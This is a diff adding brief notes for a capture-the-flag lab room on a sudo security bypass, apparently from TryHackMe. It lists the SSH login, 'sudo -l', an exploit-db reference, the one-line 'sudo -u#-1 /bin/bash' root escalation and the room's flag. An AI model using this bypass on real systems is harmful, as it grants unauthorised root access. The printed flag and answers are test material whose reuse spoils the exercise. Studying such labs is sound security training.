@@ -1,0 +1,15 @@
+#Task 2 Security Bypass 
+- What command are you allowed to run with sudo?
+hint: ssh -p 2222 tryhackme@$ip
+/bin/bash
+
+- What is the flag in /root/root.txt?
+hint: sudo -l
+https://www.exploit-db.com/exploits/47502
+sudo -u#-1 /bin/bash
+cat /root/root.txt
+THM{l33t_s3cur1ty_bypass}
+
+
+https://tryhackme.com/room/sudovulnsbypass
+https://www.exploit-db.com/exploits/47502
